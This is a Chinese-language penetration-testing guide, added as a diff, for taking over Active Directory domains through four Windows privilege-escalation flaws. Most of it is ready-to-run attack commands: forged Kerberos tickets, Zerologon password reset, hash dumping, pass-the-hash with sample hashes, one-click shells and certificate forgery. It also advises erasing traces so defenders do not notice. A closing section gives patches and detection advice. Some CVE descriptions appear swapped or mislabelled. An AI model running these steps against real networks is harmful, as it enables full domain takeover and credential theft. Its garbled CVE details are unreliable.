@@ -1,0 +1,281 @@
+## 概述
+
+在内网渗透测试中，当攻击者成功获取到域内任意一台主机的权限或一个域用户凭据后，最终目标通常是夺取整个 Active Directory (AD) 域的控制权，即获得域管理员权限。本文档整理了近年来在实战中被广泛利用的多个 Windows AD 域控权限提升漏洞，旨在为安全研究人员和渗透测试工程师提供一份详尽的技术参考和实战指南。
+
+**核心场景**：攻击者已获得一个立足点（如某服务器的 Shell 或一个域用户的账号密码），并且能够与目标域控制器 (Domain Controller, DC) 进行网络通信。在此基础上，利用特定的 CVE 漏洞，将低权限用户提升为域管理员，从而完全控制目标 AD 域。
+
+本文将深入探讨以下关键漏洞的原理、利用条件和详细攻击流程：
+
+- **CVE-2014-6324 (MS14-068)**: Kerberos 票据伪造漏洞。
+- **CVE-2020-1472 (Zerologon)**: Netlogon 协议特权提升漏洞。
+- **CVE-2021-42287 (sAMAccountName Spoofing)**: 结合 CVE-2021-42278 的域控权限提升漏洞。
+- **CVE-2022-26923 (AD CS ESC8)**: Active Directory 证书服务 (AD CS) 相关的权限提升漏洞。
+
+> **注意**: 文中提到的 `CVE-2025-33073` 似乎是一个虚构或错误的编号，根据其描述的技术（PetitPotam + NTLM Relay），该攻击链通常与 **CVE-2021-36942** 相关联。为保证技术准确性，本文将不对该虚构编号进行展开，但其涉及的 NTLM 中继攻击是一种经典且有效的提权手段。
+
+---
+
+## 技术原理
+
+### CVE-2014-6324 (MS14-068)
+
+此漏洞存在于 Windows Kerberos KDC（密钥分发中心）服务中，允许经过身份验证的域用户通过提交精心构造的 Kerberos TGT（票据授予票据）请求，获取一个包含高权限 PAC（权限属性证书）的 TGT 票据。PAC 中包含了用户的 SID、所属用户组等关键信息。攻击者通过伪造 PAC，欺骗 KDC 以为自己是域管理员，从而获得访问域内任何资源的权限。
+
+### CVE-2020-1472 (Zerologon)
+
+该漏洞源于 Netlogon 远程协议 (MS-NRPC) 中的一个加密缺陷。该协议用于域内设备与域控之间的身份验证。漏洞允许攻击者通过 `NetrServerPasswordSet2` 函数，将域控的计算机账户密码重置为空字符串。这是因为协议在建立安全通道时使用的 AES-CFB8 加密算法的初始化向量 (IV) 被错误地固定为全零。攻击者只需向域控发送 256 次特制的 Netlogon 消息，就有极大概率成功将密码置空。获得域控计算机账户的控制权后，即可进一步导出域内所有用户的哈希，最终实现域控接管。
+
+### CVE-2021-42287 & CVE-2021-42278
+
+这对漏洞组合利用了两个独立的缺陷：
+1.  **CVE-2021-42287**: 允许普通域用户在没有特殊权限的情况下，为自己控制的计算机账户添加一个与域控计算机账户同名的 `sAMAccountName`（例如，`DC1$`）。AD 默认不会严格检查这种命名冲突。
+2.  **CVE-2021-42278**: 当 KDC 在处理 TGS（服务授予票据）请求时，如果找不到请求服务主体 (SPN) 对应的账户，它会尝试在账户名后添加一个 `$` 符号再次搜索，以兼容计算机账户。
+
+攻击者首先创建一个新的计算机账户，并将其 `sAMAccountName` 修改为目标域控的名称（不带 `$`）。然后，利用这个伪造的计算机账户请求 TGT。接着，攻击者清空该计算机账户的 `sAMAccountName` 属性，并使用上一步获得的 TGT 去请求访问域控 CIFS 服务的 TGS。此时 KDC 找不到原始账户，便会自动在账户名后添加 `$`，最终错误地将域控的权限授予了攻击者。
+
+### CVE-2022-26923 (AD CS ESC8)
+
+此漏洞与 Active Directory 证书服务 (AD CS) 的配置不当有关，特别是滥用证书模板的 `dNSHostName` 属性。攻击流程如下：
+1.  攻击者利用普通域用户权限，创建一个新的计算机账户。
+2.  攻击者将这个新计算机账户的 `dNSHostName` 属性修改为目标域控的 FQDN（完全限定域名）。
+3.  攻击者利用该计算机账户，向配置不当的 AD CS 请求一个基于 "Machine" 或类似模板的证书。由于 `dNSHostName` 已被篡改，AD CS 会错误地颁发一张主体备用名称 (SAN) 为域控 FQDN 的证书。
+4.  攻击者使用这张伪造的证书进行 Kerberos 身份验证 (PKINIT)，成功模拟域控，从而获得域控权限并导出凭据。
+
+---
+
+## 环境准备
+
+在开始实战之前，请确保攻击机已准备好以下工具和环境。
+
+- **操作系统**: Kali Linux 或其他装有 Python 环境的 Linux 发行版。
+- **核心工具集**:
+    - **Impacket**: 用于网络协议交互的 Python 类库集合，是大多数攻击脚本的基础。
+        ```bash
+        pip install impacket
+        ```
+    - **Certipy**: 专用于 AD CS 滥用和枚举的工具。
+        ```bash
+        pip install certipy-ad
+        ```
+    - **bloodyAD**: 一个用于与 AD 交互的 Python 库，便于修改对象属性。
+        ```bash
+        pip install bloodyad
+        ```
+- **特定漏洞利用脚本**:
+    - **MS14-068**: [kekeo](https://github.com/gentilkiwi/kekeo) 或专用 [ms14-068.exe](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14-068) (Windows 环境)。
+    - **Zerologon**: [zerologon_tester.py](https://github.com/SecuraBV/CVE-2020-1472) 和 [cve-2020-1472-exploit.py](https://github.com/dirkjanm/CVE-2020-1472)。
+    - **sAMAccountName Spoofing**: [sam_the_admin.py](https://github.com/WazeHell/sam-the-admin)。
+- **网络配置**: 确保攻击机可以访问目标域控的相应端口（如 88, 135, 139, 445, 389, 464 等）。如果目标网络存在 DNS 解析问题，可能需要在攻击机的 `/etc/hosts` 文件中手动添加域控的 IP 和主机名映射。
+
+---
+
+## 实战示例
+
+### 场景一：CVE-2014-6324 (MS14-068)
+
+**前提**:
+- 已获得一个普通域用户的账号和密码。
+- 已获得域内一台主机的管理员权限（用于执行 `mimikatz` 或类似工具）。
+
+**攻击流程**:
+
+1.  **收集信息**: 在已控主机上获取当前用户的 SID、域名和域控地址。
+    ```powershell
+    # 获取当前用户 SID
+    whoami /user
+
+    # 获取域控 FQDN
+    net time /domain
+
+    # 检查工作站所属域
+    net config workstation
+    ```
+
+2.  **生成伪造票据**: 使用 `ms14-068.exe` 生成高权限 TGT 票据文件。
+    ```bash
+    # 格式: ms14-068.exe -u <域用户名>@<域名> -p <密码> -s <用户SID> -d <域控地址>
+    ms14-068.exe -u mary@god.org -p admin!@#45 -s S-1-5-21-1218902331-2157346161-1782232778-1124 -d OWA2010CN-God.god.org
+    ```
+    执行成功后，会在当前目录下生成一个 `.ccache` 文件，例如 `TGT_mary@god.org.ccache`。
+
+3.  **注入票据**: 使用 `mimikatz` 将伪造的票据注入到当前会话中。
+    ```powershell
+    # 清理现有 Kerberos 票据
+    kerberos::purge
+
+    # 查看当前票据（应为空）
+    kerberos::list
+
+    # 将伪造的票据注入内存 (Pass-the-Cache)
+    kerberos::ptc "TGT_mary@god.org.ccache"
+
+    # 再次查看票据，确认注入成功
+    kerberos::list
+    ```
+
+4.  **验证权限**: 尝试访问域控的 C$ 共享目录。如果成功，说明已获得管理员权限。
+    ```bash
+    dir \\OWA2010CN-God.god.org\C$
+    ```
+
+5.  **获取 Shell**: 使用 `psexec` 或 `wmiexec` 等工具获取域控的交互式 Shell。
+    ```bash
+    psexec.exe \\OWA2010CN-God.god.org cmd.exe
+    ```
+
+### 场景二：CVE-2020-1472 (Zerologon)
+
+**前提**:
+- 能够通过网络访问到目标域控。
+- 知道目标域控的 NetBIOS 计算机名。
+
+**攻击流程**:
+
+1.  **获取计算机名**: 如果不知道域控的计算机名，可以通过扫描获取。
+    ```bash
+    # nbtscan 是一个独立的工具，需要提前安装
+    nbtscan -v -h 192.168.3.21
+    ```
+
+2.  **漏洞检测**: 使用 `zerologon_tester.py` 确认漏洞是否存在。
+    ```bash
+    # 格式: python3 zerologon_tester.py <域控计算机名> <域控IP>
+    python3 zerologon_tester.py OWA2010CN-GOD 192.168.3.21
+    ```
+    如果返回 "VULNERABLE"，则表示漏洞存在。
+
+3.  **重置密码**: 执行漏洞利用脚本，将域控计算机账户密码置空。
+    ```bash
+    # 格式: python3 cve-2020-1472-exploit.py <域控计算机名> <域控IP>
+    python3 cve-2020-1472-exploit.py OWA2010CN-GOD 192.168.3.21
+    ```
+
+4.  **导出哈希**: 利用空密码登录域控，并导出所有域用户的哈希（包括 `krbtgt`）。
+    ```bash
+    # 格式: python3 secretsdump.py <域名>/<域控计算机名>\$@<域控IP> -no-pass
+    python3 secretsdump.py god.org/OWA2010CN-GOD\$@192.168.3.21 -no-pass
+    ```
+    在输出中找到域管理员的 NTLM 哈希。
+
+5.  **横向移动**: 使用域管理员的哈希进行 Pass-the-Hash 攻击，获取域控 Shell。
+    ```bash
+    # 格式: python3 wmiexec.py <域名>/administrator@<域控IP> -hashes <LM_HASH>:<NT_HASH>
+    python3 wmiexec.py god/administrator@192.168.3.21 -hashes aad3b435b51404eeaad3b435b51404ee:ccef208c6485269c20db2cad21734fe7
+    ```
+
+> **重要**: 利用后务必恢复原始密码，否则会破坏域的正常功能。恢复步骤较为复杂，通常涉及提取 `lsass.exe` 进程中的原始 `LSA secret`。
+
+### 场景三：CVE-2021-42287 & CVE-2021-42278
+
+**前提**:
+- 拥有一个普通域用户的账号和密码。
+
+**攻击流程**:
+
+这是一个高度自动化的攻击，使用 `sam_the_admin.py` 脚本即可一键完成。
+
+```bash
+# 格式: python3 sam_the_admin.py <域名>/'<用户名>:<密码>' -dc-ip <域控IP> -shell
+python3 sam_the_admin.py god/'webadmin:admin!@#45' -dc-ip 192.168.3.21 -shell
+```
+
+该脚本会自动完成以下操作：
+1.  创建计算机账户。
+2.  修改 `sAMAccountName`。
+3.  请求 TGT。
+4.  清空 `sAMAccountName`。
+5.  请求 TGS 并获得高权限。
+6.  利用该权限与域控建立连接，并提供一个交互式 Shell。
+
+### 场景四：CVE-2022-26923 (AD CS ESC8)
+
+**前提**:
+- 拥有一个普通域用户的账号和密码。
+- 域内存在配置不当的 Active Directory 证书服务 (AD CS)。
+
+**攻击流程**:
+
+1.  **信息收集**:
+    - **配置 hosts**: 在攻击机 `/etc/hosts` 文件中添加域、CA 服务器和域控的映射。
+      ```
+      192.168.3.111 xiaodi.local
+      192.168.3.111 xiaodi-DC-CA
+      192.168.3.111 DC.xiaodi.local
+      ```
+    - **获取 CA 名称**: 使用 `certutil` 或 `Certipy` 的 `find` 命令枚举 CA。
+      ```bash
+      # 在域内主机上执行
+      certutil -config - -ping
+      ```
+
+2.  **创建计算机账户**: 使用 `bloodyAD` 创建一个新计算机账户。
+    ```bash
+    python3 bloodyAD.py -d xiaodi.local -u test -p 'Pass123' --host 192.168.3.111 addComputer pwnmachine 'CVEPassword1234*'
+    ```
+
+3.  **修改 dNSHostName**: 将新计算机账户的 `dNSHostName` 属性设置为域控的 FQDN。
+    ```bash
+    python3 bloodyAD.py -d xiaodi.local -u test -p 'Pass123' --host 192.168.3.111 setAttribute 'CN=pwnmachine,CN=Computers,DC=xiaodi,DC=local' dNSHostName '["DC.xiaodi.local"]'
+    ```
+
+4.  **申请伪造证书**: 使用 `Certipy`，以新创建的计算机账户身份请求一个 "Machine" 模板的证书。
+    ```bash
+    # 格式: certipy req '<域>/<计算机名>$:<密码>@<域控IP>' -template Machine -dc-ip <域控IP> -ca <CA名称>
+    certipy req 'xiaodi.local/pwnmachine$:CVEPassword1234*@192.168.3.111' -template Machine -dc-ip 192.168.3.111 -ca xiaodi-DC-CA -debug
+    ```
+    此命令会生成一个 `dc.pfx` 文件，其中包含了域控的身份证书。
+
+5.  **使用证书获取 TGT**: 使用 `Certipy` 的 `auth` 功能，通过证书进行身份验证，获取 TGT 并保存为 `.ccache` 文件。
+    ```bash
+    certipy auth -pfx ./dc.pfx -dc-ip 192.168.3.111
+    ```
+
+6.  **获取哈希**: 利用上一步获得的 TGT（已自动加载到环境变量 `KRB5CCNAME`），使用 `secretsdump.py` 导出域内所有哈希。
+    ```bash
+    # 注意这里的认证方式，我们现在是作为域控本身进行认证
+    # -k 表示使用 Kerberos 认证, -no-pass 表示不需要密码
+    secretsdump.py -k -no-pass 'xiaodi.local/dc$@DC.xiaodi.local' -just-dc-user administrator
+    ```
+
+7.  **横向移动**: 使用获取到的域管哈希进行 Pass-the-Hash 攻击。
+    ```bash
+    python3 wmiexec.py xiaodi.local/administrator@192.168.3.111 -hashes aad3b435b51404eeaad3b435b51404ee:e6f01fc9f2a0dc96871220f7787164bd
+    ```
+
+---
+
+## 关键细节
+
+- **票据注入 (Pass-the-Cache)**: 在 MS14-068 攻击中，`kerberos::ptc` 命令是将伪造的 Kerberos 票据注入到当前登录会话的 LSASS 进程中。这使得当前用户在访问网络资源时，能够使用这个高权限票据，而无需知道管理员密码。
+- **Netlogon IV**: Zerologon 漏洞的核心是 Netlogon 协议中 `ComputeNetlogonCredential` 函数使用的 AES-CFB8 加密模式，其初始化向量 (IV) 被硬编码为 16 个零字节。这使得攻击者可以控制解密后的明文，从而绕过身份验证。
+- **sAMAccountName**: 这是 AD 对象的 "兼容性" 名称，必须在域内唯一。`sAMAccountName` 欺骗漏洞的关键在于 AD 在特定情况下对计算机账户名（以 `$` 结尾）和普通账户名的处理存在歧义。
+- **AD CS 模板**: CVE-2022-26923 的利用前提是存在一个允许低权限用户注册、并且允许在证书请求中提供主体备用名称 (SAN) 的证书模板。`ESC8` 是 SpecterOps 对这类配置不当的命名。
+- **清理痕迹**: 许多攻击（如 sAMAccountName 欺骗和 AD CS 攻击）都会在 AD 中创建新的计算机账户。在完成渗透后，应及时清理这些对象，避免被蓝队发现。Zerologon 攻击后必须恢复域控密码，否则将导致域服务中断。
+
+---
+
+## 安全总结
+
+上述漏洞揭示了 Active Directory 环境中从协议设计、实现到配置等多个层面的安全风险。作为防御方，应采取以下措施进行加固：
+
+1.  **及时更新补丁**:
+    - **MS14-068**: 安装 KB3011780 补丁。
+    - **Zerologon**: 安装 2020 年 8 月及以后发布的安全更新，并确保开启强制模式。
+    - **sAMAccountName Spoofing**: 安装 2021 年 11 月及以后发布的安全更新。
+    - **CVE-2022-26923**: 安装 2022 年 5 月发布的安全更新。
+
+2.  **强化 AD CS 配置**:
+    - 审查所有证书模板，禁用或严格限制允许 `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` 标志的模板。
+    - 确保只有特权账户才能注册允许包含任意 `dNSHostName` 的证书。
+    - 启用 "颁发要求" 并要求证书管理员手动批准高风险证书请求。
+
+3.  **监控与检测**:
+    - 监控异常的 Kerberos 票据请求，特别是 PAC 结构异常的票据。
+    - 监控 Netlogon 认证流量，检测是否存在大量失败的登录尝试或来自非预期来源的 `NetrServerPasswordSet2` 调用。
+    - 监控 AD 对象的创建和修改事件，特别是计算机账户的 `sAMAccountName` 和 `dNSHostName` 属性的异常变更。
+    - 部署专门的 AD 安全监控解决方案（如 Microsoft Defender for Identity），利用其内置的检测规则发现此类攻击。
+
+4.  **纵深防御**:
+    - 遵循最小权限原则，不要为普通用户分配不必要的权限。
+    - 实施网络分段，限制普通主机与域控之间的通信端口，增加攻击者横向移动的难度。
+    - 部署终端检测与响应 (EDR) 解决方案，及时发现和阻止 `mimikatz`、`psexec` 等恶意工具的执行。
